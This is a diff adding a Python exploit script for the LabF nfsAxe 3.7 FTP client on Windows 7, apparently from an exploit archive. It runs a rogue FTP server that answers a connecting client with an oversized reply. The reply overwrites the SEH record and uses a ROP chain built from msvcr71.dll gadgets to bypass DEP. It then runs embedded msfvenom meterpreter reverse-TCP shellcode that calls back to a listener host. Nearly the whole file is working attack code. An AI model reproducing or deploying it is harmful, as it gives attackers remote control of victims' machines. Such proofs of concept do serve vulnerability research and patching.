@@ -1,0 +1,115 @@
+#!/usr/bin/env python
+#
+# Exploit Title     : LabF nfsAxe 3.7 FTP Client (DEP Bypass)
+# Date              : 12/8/2017
+# Exploit Author    : wetw0rk
+# Vendor Homepage   : http://www.labf.com/nfsaxe/nfs-server.html
+# Software link     : http://www.labf.com/download/nfsaxe.exe 
+# Version           : 3.7
+# Tested on         : Windows 7 (x86)
+# Description       : Upon connection the victim is sent a specially crafted buffer
+#                     overwriting the SEH record, resulting in code execution. 
+#
+# Greetz: abatchy17, mvrk, and Dillage (Dilly Dilly)
+#
+# Trigger the vulnerability by :
+#   Login as -> [check] anonymous -> connect
+#
+
+import struct, socket
+
+host = "0.0.0.0"
+port = 21
+
+# msfvenom LHOST=192.168.0.12 LPORT=34 -p windows/meterpreter/reverse_tcp
+# -f python -b "\x00\x0a\x10" -v shellcode --smallest
+shellcode =  ""
+shellcode += "\x2b\xc9\x66\xb9\x18\x01\xe8\xff\xff\xff\xff\xc1"
+shellcode += "\x5e\x30\x4c\x0e\x07\xe2\xfa\xfd\xea\x81\x04\x05"
+shellcode += "\x06\x67\x81\xec\x3b\xcb\x68\x86\x5e\x3f\x9b\x43"
+shellcode += "\x1e\x98\x46\x01\x9d\x65\x30\x16\xad\x51\x3a\x2c"
+shellcode += "\xe1\xb3\x1c\x40\x5e\x21\x08\x05\xe7\xe8\x25\x28"
+shellcode += "\xed\xc9\xde\x7f\x79\xa4\x62\x21\xb9\x79\x08\xbe"
+shellcode += "\x7a\x26\x40\xda\x72\x3a\xed\x6c\xb5\x66\x60\x40"
+shellcode += "\x91\xc8\x0d\x5d\xa5\x7d\x01\xc2\x7e\xc0\x4d\x9b"
+shellcode += "\x7f\xb0\xfc\x90\x9d\x5e\x55\x92\x6e\xb7\x2d\xaf"
+shellcode += "\x59\x26\xa4\x66\x23\x7b\x15\x85\x3a\xe8\x3c\x41"
+shellcode += "\x67\xb4\x0e\xe2\x66\x20\xe7\x35\x72\x6e\xa3\xfa"
+shellcode += "\x76\xf8\x75\xa5\xff\x33\x5c\x5d\x21\x20\x1d\x24"
+shellcode += "\x24\x2e\x7f\x61\xdd\xdc\xde\x0e\x94\x6c\x05\xd4"
+shellcode += "\xe2\xb8\xbe\x8d\x8e\xe7\xe7\xe2\xa0\xcc\xc0\xfd"
+shellcode += "\xda\xe0\xbe\x9e\x65\x4e\x24\x0d\x9f\x9f\xa0\x88"
+shellcode += "\x66\xf7\xf4\xcd\x8f\x27\xc3\xa9\x55\x7e\xc6\xa7"
+shellcode += "\xc6\x6f\x18\xb1\xbe\xdb\xb6\xb5\xb6\x95\x31\x5f"
+shellcode += "\xea\xeb\xec\xed\xfe\xef\x80\x91\xaa\x29\xcb\x1a"
+shellcode += "\x26\x38\x1d\x5e\xa0\xdb\x9a\x9a\xa6\x56\x75\xa5"
+shellcode += "\xb3\x2c\x01\x50\x16\xa3\xd4\x26\x94\xd3\xa9\x31"
+shellcode += "\xb6\x2f\x55\x43\xb4\x1c\x31\x8f\xe6\x8d\xec\xbf"
+shellcode += "\xbd\x83\xee\x34\x26\xb0\x0f\x24\x79\xc5\x9e\xb5"
+shellcode += "\x9e\xf7\xe8\xf9\xfa\xad\x96\xfd\x96\xa7\xa4\x52"
+shellcode += "\xe7\xfc\xd1\x96\x55\x6d\x08\x5f\x59\x5c\x64\x0f"
+shellcode += "\xd7\xc7\x4f\xee\xc7\x12\xd7\x3c\xd0\x62\xf6\xda"
+
+def create_rop_chain():
+    # https://www.corelan.be/index.php/security/corelan-ropdb/
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = [
+    	0x7c37653d, 	# POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN
+	    0xfffffdff,	# Value to negate, will become 0x00000201 (dwSize)
+	    0x7c347f98,	# RETN (ROP NOP) [msvcr71.dll]
+	    0x7c3415a2,	# JMP [EAX] [msvcr71.dll]
+	    0xffffffff,	# 
+	    0x7c376402,	# skip 4 bytes [msvcr71.dll]
+	    0x7c351e05,	# NEG EAX # RETN [msvcr71.dll] 
+	    0x7c345255,	# INC EBX # FPATAN # RETN [msvcr71.dll] 
+	    0x7c352174,	# ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN [msvcr71.dll] 
+	    0x7c344f87,	# POP EDX # RETN [msvcr71.dll] 
+	    0xffffffc0,	# Value to negate, will become 0x00000040
+	    0x7c351eb1,	# NEG EDX # RETN [msvcr71.dll] 
+	    0x7c34d201,	# POP ECX # RETN [msvcr71.dll] 
+	    0x7c38b001,	# &Writable location [msvcr71.dll]
+	    0x7c347f97,	# POP EAX # RETN [msvcr71.dll] 
+	    0x7c37a151,	# ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]
+	    0x7c378c81,	# PUSHAD # ADD AL,0EF # RETN [msvcr71.dll] 
+	    0x7c345c30,	# ptr to 'push esp #  ret ' [msvcr71.dll]
+    ]
+    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+rop_chain = create_rop_chain()
+rop_chain += "\x90" * 20
+rop_chain += shellcode
+off2ROP = "B" * 212                 # offset to the start of our ROP chain
+off2nSEH = "A" * (9391- (           # offset the nSEH and adjustments
+    len(off2ROP) + len(rop_chain)   # account for shellcode and offset
+    )
+)
+nSEH = "BBBB"                        # SEH will be the start of the stack pivot
+SEH = struct.pack('<L', 0x68034468)  # ADD ESP,61C # POP # POP # POP # POP # POP # RETN [WCMDPA10.dll]
+trigger = "C" * (10000 - (           # fill buffer to trigger vulnerability
+    9399                             # offset + nSEH + SEH
+    )
+)
+
+buffer  = off2ROP + rop_chain + off2nSEH + nSEH + SEH + trigger
+payload = "220 %s is current directory\r\n" % (buffer)
+
+try:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.bind((host, port))
+    sock.listen(20)
+    print("[*] server listening on %s:%d") % (host, port)
+except:
+    print("[-] failed to bind the server exiting...")
+    exit()
+
+while True:
+    conn, addr = sock.accept()
+    print("[*] connection from %s:%d") % (addr[0], addr[1])
+    print("[+] sending %d bytes to target host" % (len(buffer)))
+    conn.send('220 Welcome Serv-U FTP Server v6.0 for WinSock ready...\r\n')
+    conn.recv(1024)
+    conn.send('331 OK\r\n')
+    conn.recv(1024)
+    conn.send('230 OK\r\n')
+    conn.recv(1024)
+    conn.send(payload)
